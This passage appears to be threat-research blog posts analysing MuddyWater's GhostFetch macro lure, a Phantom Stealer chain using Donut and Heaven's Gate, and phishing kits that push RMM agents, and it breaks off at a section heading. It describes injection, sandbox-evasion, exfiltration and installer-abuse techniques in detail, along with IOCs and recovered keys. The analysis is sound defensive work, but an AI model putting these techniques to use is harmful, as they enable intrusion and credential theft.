docs.title: MuddyWater Weaponizes Word Macros in Targeted Campaign Delivering GhostFetch
MuddyWater Weaponises Word Macros in Targeted Campaign Delivering GhostFetch
docs.text: In February 2026, I identified a new phishing campaign associated with MuddyWater, framed as a travel reservation from Air Arabia. When recipients enable the document's embedded macro, it installs and executes the GhostFetch loader. This post analyses the campaign's lure design, delivery mechanism, and GhostFetch behaviour, and provides practical guidance for defenders.

docs.title: Background
docs.text:
MuddyWater (also tracked as UNC5667, Earth Vetala, Mango Sandstorm, MUDDYCOAST, Seedworm, and TA450) is an Iranian state-aligned APT group operating on behalf of Iran's Ministry of Intelligence and Security (MOIS). Active since at least 2017, the group primarily targets government, telecommunications, energy, and financial sector organisations across the Middle East, North Africa, and South Asia.1 MuddyWater consistently relies on macro-enabled Office documents as initial access vectors, combined with staged payload reconstruction and business-themed lures tailored to regional targets.

GhostFetch is a first-stage downloader attributed to MuddyWater, publicly documented by Group-IB as part of Operation Olalampo — a campaign first observed on 26 January 2026 targeting organisations across the MENA region.2 GhostFetch performs environmental evasion checks before fetching and reflectively loading secondary payloads in memory, ultimately delivering GhostBackDoor — a second-stage implant that provides interactive shell access, file manipulation, and AES-encrypted C2 communications through French-named API endpoints.3 The analysis here was conducted independently and predates Group-IB's public reporting, allowing for cross-referencing against their findings on the delivered GhostBackDoor implant.

docs.title: Reservation Document Lure Analysis
docs.text:
I identified a malicious Word document associated with MuddyWater uploaded to VirusTotal from the UAE on 30 January 2026. The file, titled "Sajeev Saliha Beevi.doc," masquerades as a legitimate Air Arabia reservation itinerary. The document embeds detailed booking information, including the reservation number, flight routes between Abu Dhabi (AUH) and Thiruvananthapuram (TRV), passenger details, and travel agent information. Its professional formatting and realistic travel metadata indicate that the lure was crafted to appear operationally authentic.

Although the original delivery mechanism remains unknown, the content suggests MuddyWater aimed this document at individuals or organisations with ties to the UAE travel corridor — including corporate travel coordinators, finance departments, and business travelers.

Exhibit 1: Weaponised Lure Word Document

The document's metadata further supports attribution to MuddyWater and aligns with the group's established operational practices. The file lists "DontAsk" as the author and "FireToRain" as the last saving user, with Microsoft Office Word as the originating application. The document contains 10 recorded revisions with an approximate total editing time of six minutes. The "Content created" timestamp of 25 January 2026 at 12:52 AM and "Date last saved" timestamp of 26 January 2026 at 11:55 AM indicate a compressed preparation window of roughly 24–72 hours before deployment.

This pattern is consistent with MuddyWater operational workflows observed across multiple campaigns. Earlier reporting identified lure documents authored on Windows systems and saved under operator-associated usernames including "jojo" and "phoenix". Taken together, the metadata artefacts, lure construction, and macro-based execution workflow support a moderate to high confidence assessment that the document reflects established MuddyWater tradecraft.

Exhibit 2: Weaponised Lure Word Document Metadata

While the document appears benign to the end user, technical analysis reveals embedded VBA macros configured to execute automatically when the file opens. The macro functions as a first-stage dropper — it reconstructs an encoded Windows PE file embedded within a "UserForm" object, writes the payload to disk, and executes it.

docs.title: VBA Macro Analysis
docs.text:
The macro is designed to execute when the document opens in Microsoft Word with macros permitted — either through explicit user consent or in environments where macro security controls are disabled or insufficiently enforced.

Once triggered, the macro initiates a staged execution sequence that reconstructs and deploys a concealed second-stage payload embedded within the document. The malicious logic resides entirely within the VBA project. When opened in the Word VBA editor, the VBA project appears password protected.

Exhibit 3: Password Protected VBA Project

However, extraction of the VBA streams confirms that the primary execution logic resides within the "ThisDocument" class module.

Exhibit 4: Word Document Stream Dump

The macro implements a staged workflow. It first calls a delay function (wait()), likely to impede automated analysis. It then retrieves a numerically encoded string from UserForm1.TextBox1.Text and decodes it in three-digit increments to reconstruct a Windows Portable Executable (PE) payload.

If the payload does not already exist on disk, the macro writes the decoded content to C:\Users\Public\Documents\MicrosoftWordUser.log, renames it to MicrosoftWordUser.exe, and executes it via ShellExecute. This sequence functions as a self-contained dropper that reconstructs and launches the embedded second-stage payload.

Exhibit 5: Staged Macro Dropper

The numerically encoded string retrieved from UserForm1.TextBox1.Text serves as the embedded payload container. The associated UserForm1/o stream contains a large sequence of decimal values.

Exhibit 6: UserForm1/o Stream Content

The macro's decoding routine processes this string in three-character increments, converting each three-digit value into its corresponding ASCII byte to reconstruct the raw binary payload in memory.

Exhibit 7: Staged Macro Dropper Decoding Routine Exhibit 8: "MZ" Signature that Identifies a Windows Portable Executable (PE) File

Before writing and executing the reconstructed executable, the macro checks for the presence of MicrosoftWordUser.exe using the Dir() function, preventing redundant deployment. It writes the payload as MicrosoftWordUser.log, renames it to MicrosoftWordUser.exe, then instantiates the Shell.Application COM object and invokes ShellExecute to launch the renamed executable.

Exhibit 9: Conditional File Write and Execution Logic

In summary: when Document_Open() triggers, the macro introduces artificial delays, decodes the numerically encoded payload from a UserForm stream, writes it to C:\Users\Public\Documents\MicrosoftWordUser.log, renames it to MicrosoftWordUser.exe, and executes it via Shell.Application.

docs.title: GhostFetch Analysis
docs.text:
The executable dropped by the VBA macro is GhostFetch — the first-stage downloader documented by Group-IB as part of Operation Olalampo.2 Unlike the macro, which functions solely as a delivery mechanism, GhostFetch implements a multi-stage execution flow covering environmental evasion, persistence installation, and encrypted C2 communication. Static analysis identifies it as a 64-bit Windows PE compiled using Microsoft Visual C++.

Exhibit 10: DIE (Detect it Easy) Static Analysis Metadata Output

docs.title: Anti-Analysis / Anti-Debugging / VM Detection
docs.text:
Before any persistence or network activity begins, GhostFetch runs an anti-debugging check at FUN_140006080. It first inspects the Process Environment Block (PEB), checking the BeingDebugged flag and NtGlobalFlag. If either indicates a debugger is present, GhostFetch immediately exits.

Exhibit 11: PEB Checks and NtQueryInformationProcess Resolution

GhostFetch performs a screen resolution check at FUN_140004190 as an additional sandbox and VM detection layer. The function calls GetMonitorInfoW to retrieve display dimensions, then compares them against a hardcoded whitelist of width and height combinations. Valid widths are 1440, 1920, and 2560 pixels; valid heights are 900, 1080, 1200, and 1600 pixels. If the detected resolution does not match any expected combination, GhostFetch sets an abort flag — sandbox environments and VMs commonly run at atypical resolutions such as 800×600 or 1024×768.

Exhibit 12: Screen Resolution Check Exhibit 13: GetMonitorInfoW Function Call Exhibit 14: Screen Resolution Detection Validation Logic

GhostFetch also implements a composite sandbox detection routine at FUN_140004260, invoked only if the screen resolution check has already flagged the environment as suspicious. Rather than relying on a single indicator, the function combines three independent hardware checks and returns 1 to trigger abort only if all three conditions are simultaneously true — minimising false positives on real endpoints.

Exhibit 15: Conditional Execution Chain

The three checks are: logical processor count (fewer than two CPUs flags as sandbox), total physical RAM (less than 2 GB flags as sandbox), and USB device history via the Windows registry (fewer than two historically connected devices flags as sandbox).

Exhibit 16: Sandbox Fingerprinting Logic Exhibit 17: Composite Return Logic

GhostFetch enumerates all running processes and compares them against a hardcoded list of security tools and analysis frameworks. If any listed process is detected, execution aborts immediately. The enumeration operates in two phases: a targeted check for antivirus product processes, followed by runtime decoding of obfuscated analysis tool names.

Exhibit 18: AV Detection ("avp.exe" — Kaspersky Anti-Virus process)

The complete list of targeted processes covers every major category of analysis tooling — debuggers (ollydbg.exe, immunitydebugger.exe, windbg.exe, x32dbg.exe, x64dbg.exe), disassemblers (ida.exe, ida64.exe, idaq.exe, ida664.exe, pestudio.exe), dynamic instrumentation (frida-helper-32.exe, frida-helper-64.exe), process inspection tools (processhacker.exe, procexp.exe, procmon.exe), network analysis tools (wireshark.exe, fiddler.exe, httpdebugger.exe), and sandbox platforms (joeboxcontrol.exe, joeboxserver.exe).

Exhibit 19: Example Runtime Decoding of Obfuscated Process Name ("ollydbg.exe")

docs.title: Mouse Logging
docs.text:
GhostFetch implements a system-wide mouse logging capability at FUN_1400040c0. The function installs a low-level mouse hook using SetWindowsHookExW with hook type 0xE (WH_MOUSE_LL), intercepting all mouse events system-wide — clicks, movements, and scroll wheel input — before they reach any application.

Exhibit 20: Mouse Hook via SetWindowsHookExW Exhibit 21: GetMessageW Message Pump Loop Maintaining the Mouse Hook Exhibit 22: DefWindowProcW Message Pump Loop Maintaining the Mouse Hook

docs.title: Persistence
docs.text:
After successful execution, GhostFetch installs a persistent copy of itself at %LOCALAPPDATA%\Microsoft\Windows\BurnUtill\burn.exe. Both the directory name and subdirectory structure are reconstructed at runtime from obfuscated short arrays decoded through a per-position subtraction scheme. The self-copy logic first decodes the target directory path, creates it if absent, opens the running executable for reading, copies the PE image into a heap-allocated buffer, and writes the result to the decoded destination path.

Exhibit 23: Runtime Construction of the "burn.exe" Destination Path

docs.title: C2 Infrastructure
docs.text:
The analysed sample maintains a hardcoded list of 20 C2 hosts. The primary entry, promoverse[.]org, is stored in plaintext and embedded directly in the binary as raw character bytes with no obfuscation.

Exhibit 24: C2 Domain (promoverse[.]org)

The full C2 request URL hxxps://promoverse[.]org/api/debut is assembled at runtime from three components stored separately in the binary. The host appears as raw character bytes; the URL path /api/debut is stored as an encoded short integer array decoded using the same XOR-based decoder used for other obfuscated strings. All three components are passed to WinHttpOpenRequest at runtime.

Exhibit 25: "/api/debut" URL Path

The remaining 19 C2 entries are lightly encoded — each stored as a byte sequence recovered at runtime by adding a fixed numeric offset. In the analysed sample, all 19 decode to invalid placeholder strings following the pattern 999.999.999.999x, counting down from 9998 to 9980. This is inconsistent with real operator infrastructure and strongly suggests the binary was compiled with generated placeholder values. The slots can hold up to 16-character strings, and the presence of promoverse[.]org in slot zero confirms the mechanism can store domain names.

Exhibit 26: Decoded C2 / Placeholder Entries

As this analysis was being finalised, Group-IB published their Operation Olalampo report independently documenting the same loader and including a retrieval of the encrypted second-stage payload from promoverse[.]org.2 This timing allowed cross-referencing their findings on the delivered GhostBackDoor implant against static analysis, filling the one gap that could not be resolved from the binary alone.

According to Group-IB, GhostBackDoor functions as a second-stage implant that adapts its persistence mechanism based on available system privileges — often masquerading as the Windows Recycle Bin ClassID or establishing itself as a service named MicrosoftVersionUpdater. Once reflectively loaded into memory, the backdoor facilitates interactive shell access and file manipulation through AES-encrypted communications with French-named API endpoints, purposefully fragmenting network traffic into separate requests to evade behavioural detection.3

docs.title: From Invoice Lure to In-Memory Injection: Phantom Stealer via Donut and Heaven's Gate
From Invoice Lure to In-Memory Injection
docs.text: In January 2026, I identified a phishing campaign leveraging compromised supplier mailboxes and a multi-stage infection chain to deploy Phantom Stealer using obfuscated batch loaders, in-memory PowerShell decryption, Donut shellcode injection, and Heaven's Gate evasion. This post analyses the campaign's tradecraft, persistence mechanisms, and data exfiltration methods.

docs.title: Background
docs.text:
Phantom Stealer is a commodity information-stealing malware family marketed within underground forums as a stealer-as-a-service (SaaS) offering. Proofpoint researchers have documented significant code overlap between Phantom Stealer and Stealerium — an open-source stealer project — with Phantom Stealer representing one of several derivatives built on that codebase.1 The malware targets browser-stored credentials, cryptocurrency wallets, FTP clients, email applications, and session tokens from platforms such as Discord and Telegram. HP's December 2025 Threat Insights Report identified Phantom Stealer as one of several purchasable malware kits being actively weaponised by threat actors to evade detection through regularly updated evasion modules.2

Donut is an open-source shellcode generation framework that converts .NET assemblies, native executables, and scripts into position-independent shellcode executable entirely in memory, without touching disk.3 Its legitimate use in red team operations has made it a common fixture in commodity malware chains seeking to bypass file-based AV detection.

Heaven's Gate is an evasion technique that exploits the Windows on Windows 64-bit (WoW64) compatibility layer to execute 64-bit code from within a 32-bit process. First documented around 2009, it has since been adopted by a range of malware families — including FormBook4 and ACRStealer5 — to bypass user-mode API hooks that endpoint security products place on the 32-bit Windows API layer.

docs.title: Key Highlights
docs.text:
• Threat actors leveraged previously compromised supplier email accounts to distribute phishing messages, increasing credibility and bypassing trust-based controls
  • The campaign employed an obfuscated Batch loader, embedded Base64 PowerShell payload, AES decryption, and in-memory shellcode injection into explorer.exe to avoid disk-based detection
  • Phantom Stealer implemented WoW64 architectural mode switching to execute 64-bit code from a 32-bit process, bypassing user-mode API hooks and complicating endpoint monitoring
  • Stolen credentials, wallet data, and session artefacts were compressed, transmitted via Telegram or Discord infrastructure, and followed by local artefact cleanup to reduce forensic visibility

docs.title: Campaign Analysis
docs.text:
In January 2026, I observed a phishing campaign targeting companies across multiple industry sectors. The campaign uses deceptive procurement-themed lures to trick employees into interacting with malicious attachments, delivering Phantom Stealer through a multi-stage attachment chain.

Notably, attackers abused seemingly legitimate supplier accounts as sending infrastructure — sender mailboxes were likely compromised prior to the phishing activity. The campaign uniquely leveraged compromised accounts originating from the United Arab Emirates and Qatar. In some cases, the same company was targeted with several different lures, all designed to deliver the same Phantom Stealer payload.

This campaign is not isolated. In December 2025, security researchers documented Operation MoneyMount-ISO — a campaign targeting financial services, accounting, procurement, legal, and HR functions — which used fake payment confirmation emails with malicious ISO attachments to deploy Phantom Stealer, exfiltrating data via Telegram bots and Discord webhooks.6

Recipient domain analysis indicates targeting across industrial manufacturing, engineering, agricultural export, chemicals, and energy-related sectors in Europe and Asia.

Exhibit 1: Phishing Samples Observed

docs.title: First Stage: Batch Dropper
docs.text:
The attached compressed file contains a Windows Batch script executed once the archive is opened and the file is launched. The script is heavily padded with randomised variable assignments and meaningless arithmetic operations intended to obscure the script's true behaviour and delay manual analysis.

Upon execution, the Batch file relaunches itself in a minimised window to reduce user visibility and copies its own contents into a newly created directory under the user's roaming AppData path. It then establishes persistence by adding a registry value under the current user's Run key, ensuring the malicious Batch file executes automatically at each login.

After establishing persistence, the script prepares a secondary payload embedded directly within the Batch file itself — no external retrieval required. The embedded payload is located on the final line of the Batch file, prefixed with the distinctive marker string ::M0SjGsVxEzjdf formatted as a Batch comment, making it invisible during normal script execution.

Exhibit 2: Attached ".bat" File

The script reads its own contents using PowerShell, searches for the marker to identify the start of the encoded data, extracts everything following it, and treats it as Base64 encoded content. This data is decoded and written to %TEMP%\continue.ps1 — referenced in the script via the variable UNIVERSE.

The file is then executed immediately using PowerShell with a hidden window and execution policy bypass. Following execution of the decoded PowerShell payload, the temporary script file is deleted to minimise residual artefacts on disk.

docs.title: Second Stage: PowerShell Payload and In-Memory Injection
docs.text:
The PowerShell code is the second-stage loader responsible for decrypting, injecting, and executing the primary malicious component entirely in memory. It transitions execution from script-based logic into native code by preparing an encrypted payload for runtime decryption and remote execution within a legitimate Windows process.

The script begins by collecting basic host context through environment variables and enforcing single-instance execution via a named mutex using System.Threading.Mutex. An attempt is made to open an existing mutex named CRACKHONOR_Mtx — if it already exists, execution terminates immediately, preventing multiple concurrent instances. The script then verifies the presence of a running explorer.exe process and retrieves the associated PID, exiting if a valid target cannot be identified.

Exhibit 3: PowerShell Payload (Beginning of File)

The embedded payload is stored as a large Base64 blob, decoded and decrypted at runtime using the .NET cryptography framework. Decryption uses AES in CBC mode with PKCS7 padding. The encryption key is derived by computing the SHA-256 hash of a hardcoded passphrase, while the initialisation vector is statically defined and decoded from a Base64 string. Once decrypted, the resulting byte array represents raw executable code for in-memory execution.

To execute this payload, the script dynamically compiles inline C# using Add-Type to expose native Windows API functions from kernel32.dll.

Exhibit 4: Native API Injection Setup via Add-Type

The injection sequence uses OpenProcess to obtain a handle to explorer.exe, VirtualAllocEx to allocate remote memory, WriteProcessMemory to copy the decrypted payload, VirtualProtectEx to mark memory as executable, and CreateRemoteThread to transfer execution. The payload executes entirely within explorer.exe's address space without ever being written to disk as a standalone executable.

After successful injection, the script enters a persistent monitoring loop — if explorer.exe terminates or restarts, the script repeats the injection routine against the new instance, ensuring continued execution across process restarts.

docs.title: Third Stage: Donut Shellcode Loader
docs.text:
The decrypted payload injected into explorer.exe is position-independent shellcode generated using Donut version 0.9.2.3 This shellcode serves as the third stage and is responsible for unpacking and executing the final payload — a .NET assembly identified as Phantom Stealer.

The AES key was derived from the SHA-256 hash of the passphrase restore_31_phazzy Lee, with the initialisation vector decoded from the embedded Base64 value S+hKtckT2gd+1tyosBp/LA==.

Exhibit 5: Shellcode Donut Loader

The shellcode structure follows the documented Donut framework architecture. Execution begins with a relative CALL instruction at offset zero that jumps over approximately 600 kilobytes of encrypted payload data to reach the unpacker stub at offset 0x9329D.

Exhibit 6: Donut Shellcode Entry Point

API resolution is performed entirely without import table entries through PEB traversal, matching the implementation in Donut's /peb.c source file. The function at offset 0x9612D accesses the Thread Environment Block via the GS segment register, walks to the PEB loader data structures, and enumerates loaded modules to locate required DLLs.

Exhibit 7: PEB Walking Function

For each dependency, the loader parses the PE export directory and computes a hash of exported function names for comparison against precomputed values embedded in the shellcode configuration.

Exhibit 8: PE Export Parser Function Exhibit 9: DLL Extension Appending Logic

docs.title: Phantom Stealer Analysis
docs.text:
Exhibit 10: Phantom Stealer Advertised Offers

Beyond standard obfuscation, the analysed sample incorporates advanced runtime evasion that distinguishes it from typical commodity stealers. Static analysis of the extracted .NET assembly reveals a class named HeavensGate within the Stub namespace, indicating the malware implements architectural mode switching to circumvent endpoint security monitoring.

docs.title: Heaven's Gate: Architectural Mode Switching
docs.text:
The Heaven's Gate technique exploits the WoW64 compatibility layer to execute 64-bit code from within a 32-bit process. The fundamental principle relies on the fact that 32-bit processes running under WoW64 are hosted within a native 64-bit process, with the 64-bit ntdll.dll loaded at initialisation. Security products that instrument only the 32-bit ntdll.dll remain blind to system calls issued directly through the 64-bit layer.

The HeavensGate class first verifies execution within a 32-bit process context, then resolves critical functions from the 64-bit ntdll.dll — including LdrLoadDll, LdrUnloadDll, LdrGetDllHandle, and LdrGetProcedureAddress — through custom PEB traversal routines implemented in the Utils64 helper class. A static boolean field named operational gates all subsequent 64-bit execution attempts.

Exhibit 11: Heaven's Gate Initialization Resolving 64-bit NTDLL Exports

The core implementation resides in the Execute64 method and its associated shellcode stub stored in the Wow64ExecuteShellCode byte array.

Exhibit 12: Shellcode Stub Performing x86 to x64 Code Segment Transition

This shellcode performs the critical code segment register manipulation — switching from the 32-bit segment selector 0x23 to the 64-bit selector 0x33 through a far jump instruction, then transitioning back to 32-bit mode after execution completes. This allows Phantom Stealer to call 64-bit versions of LoadLibrary and GetProcAddress, loading and invoking functions from 64-bit DLLs while evading any monitoring hooks present in the 32-bit execution layer.

Exhibit 13: Dynamic 64-bit Shellcode Generation Following Windows x64 Calling Convention

docs.title: Data Exfiltration via Telegram Bot API
docs.text:
Phantom Stealer uses the Telegram Bot API as its primary exfiltration channel — a technique increasingly favoured by commodity stealers due to its reliability, encryption in transit, and the difficulty defenders face in blocking legitimate Telegram infrastructure without disrupting business operations.

The TelegramSendLogs class implements the complete exfiltration workflow. The SendReportAsync method orchestrates upload of harvested data files through the UploadToTelegram helper class before transmitting a formatted summary message.

After upload, the malware attempts to delete local evidence — removing .txt, .png, and .json files from its working directory as a basic anti-forensics measure. The Telegram bot token and chat identifier are stored in the Config class and retrieved through StringsCrypt.DecryptConfig, which decrypts ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I= at runtime to reveal the base API endpoint.

Exhibit 14: Telegram Exfiltration Workflow with Post-upload Evidence Deletion

The SendMessageInfoAsync method constructs a detailed victim profile in Telegram's Markdown parsing mode, including Windows version, username, computer name, detected antivirus product, gateway IP, internal IP, and external IP. The report provides a statistical breakdown of harvested data by type — passwords, credit cards, cookies, browser wallet extensions, desktop cryptocurrency wallets, FTP credentials, VPN accounts, and session data from Outlook, FoxMail, Telegram, Discord, and WinScp.

Configuration flags indicating whether persistence, keylogging, screenshot capture, clipboard hijacking, and file grabbing modules are active are appended, giving the operator full visibility of implant capabilities. Notably, the message footer contains direct attribution to the malware author via the Telegram handle Oldphantomoftheopera and the marketing website phantomsoftwares[.]site, confirming the stealer-as-a-service distribution model.

Exhibit 15: Phantom Stealer Author Indicators Embedded in Exfiltration Payload

docs.title: Malicious Distribution of RMM Tools via Adobe-Themed Download Infrastructure
docs.text:
In March and April 2026, I observed a some spearphishing samples that were most likely a part of a phishing campaign targeting financial departments in Europe and across multiple sectors. The campaign directed victims to previously compromised websites hosting fake Adobe software that deployed Remote Monitoring and Management (RMM) tools to establish access to victim systems. In one observed case, the phishing email, purporting to be a document pending to be signed, was delivered to the victim mailbox, passing email security filters (Exhibit 1).

Exhibit 1: Phishing Email Received by the Victim

docs.title: Initial Access: Phishing Email Analysis
docs.text:
The email contained a hyperlink purporting to direct the recipient to an Adobe document awaiting signature, with the sender impersonating "Adobe Acrobat Sign." The message leveraged Adobe trademarks and branding elements, increasing the likelihood that the email would appear legitimate to recipients.

Looking at the raw email headers, the sender domain hpgrp[.]com was spoofed. The headers also expose 153.127.234[.]4 as part of the message delivery path — an IP I have observed in several phishing campaigns dating back to early 2025, suggesting the attacker reuses infrastructure across related operations.

docs.title: Delivery: Fake Adobe Download Page
docs.text:
Upon clicking the "Access your Complete Document" button, the victim is redirected to echo-resorts[.]com/adobe/, where a message claims that their Adobe version has expired (Exhibit 2). The page then triggers an automatic fake Adobe software download without requiring further user interaction (Exhibit 3).

Exhibit 2: Fraudulent warning message

Exhibit 3: Automatically Downloaded Fake Adobe Software

docs.title: Payload: SuperOps RMM Agent
docs.text:
On execution the file does not install any Adobe product. Instead it kicks off the setup wizard for SuperOps (Exhibit 4) — a legitimate RMM platform developed by Superops Inc. and designed for Managed Service Providers (MSPs) to remotely monitor, manage, and control client endpoints. SuperOps RMM gives the operator remote shell access, file transfer, arbitrary command execution, software deployment, and real-time system monitoring. While intended for legitimate IT administration, RMM tools have become an increasingly favoured vector for threat actors — full remote access through trusted, digitally signed binaries that endpoint security solutions tend to whitelist by default.

Exhibit 4: SuperOps RMM setup wizard

docs.title: MSI Payload Analysis
docs.text: I pulled the MSI apart and assess that the threat actor registered a SuperOps.ai RMM account, getting a tenant on the European production infrastructure. SuperOps offers a 14-day free trial that gives full agent generation, including the ability to download pre-configured MSI installers — no identity check, no payment. The MSI itself is a stock SuperOps build: legitimately signed with a valid Sectigo code signing certificate issued to Superops Inc. (Delaware, US), and no modifications in the agent binary itself (Exhibit 5).

docs.title: Certificate Details
docs.text: Field Value Name Superops Inc. Status Valid Issuer Sectigo Public Code Signing CA R36 Valid From 12:00 AM 04/14/2023 Valid To 11:59 PM 07/13/2026 Thumbprint CBF98AFF4D4BD00B83018D60ABE11DDF95C34664 Serial Number 3E 4F 07 83 9D 57 49 85 80 4D A5 5C 80 B5 D9 C0 > Exhibit 5: SuperOps RMM Certificate Details

docs.title: Tenant Authentication via Filename
docs.text:
SuperOps embeds tenant authentication credentials directly in the MSI filename. When an MSP generates an agent installer from the SuperOps platform, the resulting filename follows the convention:

<prefix>_<tenantID_base36>_<siteID_base36>_<platform>_<architecture>.msi

Exhibit 6: SuperOps Application Naming Convention

The MSI's internal "Custom Action" table confirms the installer reads its own filepath at execution time and extracts the filename to authenticate the installation to the correct tenant account. The MSI even enforces filename integrity with the warning: "Please make sure the file name is not altered and used as it is downloaded from the site." SuperOps' own documentation backs this up: "Do not rename the .msi and .pkg agent files, as the system will not be able to recognize the installed agent" (Exhibit 7).

Exhibit 7: SuperOps Documentation Regarding TenantID and SessionID

The catch is that the installer only actually validates the tenant and site ID positions within the filename (positions [len-4] and [len-3] from the underscore-delimited segments). The first segment — the prefix — is not validated and can be freely modified without breaking the installer. The threat actor abused this by replacing the default prefix with "Adobe", producing the filename Adobe_1M021SDPX2OZK_19SI0B7FBSUF4_windows_x64.msi.

docs.title: Execution Flow
docs.text: On execution, the MSI's Custom Action DLL extracts the filename from the MSI's filepath on disk, then launches the embedded Go binary (superopssetup.exe) with the full filename passed as a command-line argument. The binary decodes the tenant and site IDs and registers the victim's machine with the attacker's SuperOps account.

docs.title: C2 Infrastructure
docs.text:
The binary's embedded configuration is SERVER_LOCATION=EU and SERVER_TYPE=PROD, targeting the European production C2 infrastructure. The C2 endpoints are:

Endpoint Value RMM Server euagent.superops[.]ai Lambda API lambdaapi.superopsmsp[.]com WebSocket ws.superopsmsp[.]com Registration Endpoint POST euagent.superops[.]ai/rmm-web/rmm/getInstallerInfoForRegAsset

docs.title: Abuse of RMM Tools in the Wild
docs.text:
The abuse of RMM tools by threat actors is well documented and growing. In January 2023 CISA, NSA, and MS-ISAC issued joint advisory AA23-025A specifically warning of the malicious use of legitimate RMM software delivered via phishing. SuperOps in particular has been linked to multiple campaigns:

  • In May 2024, CERT-UA identified threat actor UAC-0188 delivering SuperOps RMM to financial institutions in the US and Europe via trojanised Minesweeper clones.
  • In January 2026, ASEC documented ongoing campaigns distributing SuperOps, Syncro, NinjaOne, and ScreenConnect RMM tools disguised as PDF invoices, noting that these tools have been previously associated with ransomware operators including Chaos, Royal, ALPHV/BlackCat, Hive, and Lunar Spider, as well as the Iranian APT group MuddyWater.
  • ThreatDown has identified SuperOps abuse by the CACTUS ransomware group.
  • In December 2025, SuperOps published a statement acknowledging the misuse and confirming it originated from illegitimate accounts.

At this stage I couldn't pin the activity on a specific actor based purely on the payload — the TTPs are consistent with the broader RMM abuse trend documented across multiple sources. So I went hunting on the infrastructure side instead.

docs.title: Discovery of the Phishing Page Source Code
docs.text:
I pivoted on the observed network infrastructure — suspicious download URLs, hosting patterns, and the Adobe-themed lure paths used to push the RMM agents — which surfaced a number of additional domains tied to the same delivery infrastructure.

I also saw multiple RMM tools in play. On top of the SuperOps and ConnectWise observations, the broader infrastructure and lure patterns suggested distribution of other legitimate RMM software like ITarian, Atera, and SimpleHelp — which lines up with the wider trend of threat actors leaning on legitimate administrative tooling for remote access and persistence.

docs.title: Additional IoCs (Infrastructure Pivoting)
docs.text: Domain Kipcarroll[.]com echo-resorts[.]com updatemsi[.]online shopnoshiribd[.]com akspolymers[.]com apnrmicrofinance[.]com avetmart[.]com idealtailorsbd[.]com ukslingandtackle[.]co[.]uk us06web[.]com virtualreader[.]top adobeacrowbat[.]com adobereaderportal[.]com adobereader[.]ink unaux[.]com adobesignupdate-adobeexpressazure[.]com adobesupdate[.]com workvenntures[.]com mafussa[.]net adobeclient[.]online cincyspinecare[.]com oticaprismajundiaicom[.]br gmqindustries[.]com us06net[.]com

docs.title: Phishing Kit Analysis
docs.text:
Pivoting further on the threat actor domains and hosting patterns, I managed to pull down the complete source code of the phishing page deployed on the compromised website (Exhibit 8). The PHP source files (index.php, download.php, settings.php) are a purpose-built phishing kit designed to impersonate an Adobe Reader update page and deliver the SuperOps RMM agent, with real-time operator visibility into victim interactions (Exhibit 9). The page presents a convincing Adobe-branded warning — "Your Adobe Reader Version Has Expired" — and includes a countdown timer that triggers an automatic download of the payload after a configurable delay (set to 10 seconds in this deployment). There's also a manual "Download Update Now" button. The downloaded file is served as AdobeReaderDC.ClientSetup.exe — not the MSI itself — suggesting the operator wraps or renames payloads depending on the delivery method.

Exhibit 8: Adobe Phishing Page Source Code

Exhibit 9: Fake Adobe Update Site Observed in Phishing Campaign

docs.title: Telegram Operator Notifications
docs.text:
The kit is configured to send real-time notifications to the operator via a Telegram bot (Exhibit 10).

Exhibit 10: Telegram Notifications Logic

Both page visits and file downloads trigger separate Telegram alerts containing detailed victim information: IP address, geolocation (resolved via the ip-api.com service), browser type, device type, ISP, referrer URL, and timestamp. That gives the operator immediate visibility into which targets clicked the phishing link and whether they downloaded the payload.

docs.title: Log Analysis
docs.text: The visits.log and downloads.log files recovered alongside the phishing kit source code show activity going back to 13 April 2025. The logs record multiple IP addresses that interacted with the phishing page, including 191.96.207[.]10 (geolocated to Kerkrade, the Netherlands) and 102.182.190[.]199 (geolocated to Cape Town, South Africa) — both appearing frequently across the entries. The provenance of the logs themselves can't be independently verified, so I can't tell with confidence whether these IPs represent threat actor infrastructure, testing activity, victims, or third-party researchers.

docs.title: Additional Findings
docs.text:
Two more findings from the recovered files.

ConnectWise ScreenConnect distribution: the executable hosted on the phishing page at the time of collection (AdobeReaderDC.ClientSetup.exe, SHA256 47ccb2d4ebf50f962d89f7827316a10376377a86ba427279294bcec1326b0918) was actually a ConnectWise ScreenConnect installer — not the SuperOps MSI delivered to the targeted user — which confirms that the same phishing infrastructure is used to push multiple RMM tools, swapping the payload depending on the campaign phase or target.

Anti-analysis .htaccess configuration: the .htaccess file (SHA256 cf0a46f5b89ce3d7af6b7305a6d404526a4773445769ce67bcbf427aed30673d) deployed alongside the kit shows real operational awareness from the operator. It blocks all mobile devices (the payload is Windows-only), search engine crawlers (Google, Bing, Yandex, Baidu, DuckDuckGo), SEO analysis tools (Ahrefs, SEMrush, Majestic), security scanners (Nessus, Nikto, Acunetix, Qualys, Nmap, SQLmap, Nuclei, WPScan), headless browsers and automation frameworks (Puppeteer, Selenium, PhantomJS, Playwright), social media crawlers (TelegramBot, Twitter, LinkedIn, Slack, Discord), command-line tools (curl, wget, python), and empty user agents.

The interesting bit is that the .htaccess also blocks specific Google infrastructure IPs (172.253.234[.]208, 172.253.234[.]223, 172.253.192[.]126, 172.253.192[.]123, 172.253.216[.]59, 173.194.92[.]180) that match entries in the recovered downloads.log — meaning the operator actively monitors traffic to the phishing page and reactively updates the blocklist as crawlers hit it (Exhibit 11).

Exhibit 11: Content of ".htaccess" File

docs.title: Discovery of a Microsoft Teams-Themed Phishing Kit Delivering Datto RMM
docs.text:
Pivoting further on the .htaccess file (SHA256 cf0a46f5b89ce3d7af6b7305a6d404526a4773445769ce67bcbf427aed30673d), I recovered a second, distinct phishing kit from the same threat actor infrastructure (Exhibit 12). Where the first kit impersonated Adobe Reader and delivered SuperOps, this one impersonates Microsoft Teams and delivers a Datto RMM agent — confirming the operator runs multiple parallel campaigns with different social engineering themes and RMM payloads, all stitched together by the same tooling and tradecraft.

Exhibit 12: Second Phishing Kit

docs.title: Shared .htaccess Configuration as an Attribution Anchor
